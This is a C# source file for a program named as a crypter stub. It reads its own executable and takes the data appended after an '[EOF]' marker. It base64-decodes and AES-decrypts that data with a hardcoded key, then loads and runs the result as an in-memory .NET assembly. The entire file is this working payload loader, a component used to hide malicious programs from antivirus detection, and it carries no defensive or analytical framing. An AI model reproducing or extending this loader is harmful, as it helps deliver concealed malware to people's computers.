using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Patrick_Crypter_Stub
{
    internal static class Program
    {
        /// <summary>
        ///  The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            //Application.EnableVisualStyles();
            //Application.SetCompatibleTextRenderingDefault(false);
            //Application.Run(new Form1());


            string stub = File.ReadAllText(AppDomain.CurrentDomain.FriendlyName.Replace(".vshost", ""));
            string file = File.ReadAllText(Environment.CurrentDirectory + "\\" + AppDomain.CurrentDomain.FriendlyName.Replace(".vshost", ""));

            string password = "AfzdIHOfGi7323Sf";


            RijndaelManaged rijAlg = new RijndaelManaged();
            rijAlg.Key = Encoding.ASCII.GetBytes(password);
            rijAlg.IV = Encoding.ASCII.GetBytes(password);
            ICryptoTransform decryptor = rijAlg.CreateDecryptor(rijAlg.Key, rijAlg.IV);

            MemoryStream msDecrypt = new MemoryStream();
            CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Write);
            //
            if (file.Contains("[EOF]"))
            {
                byte[] base64 = Convert.FromBase64String(file.Substring(file.IndexOf("[EOF]") + "[EOF]".Length));

                csDecrypt.Write(base64, 0, base64.Length);
                csDecrypt.Close();

                Assembly asm = Assembly.Load(msDecrypt.ToArray());

                asm.EntryPoint.Invoke(null, new object[] { });




            }
        }
    }
}
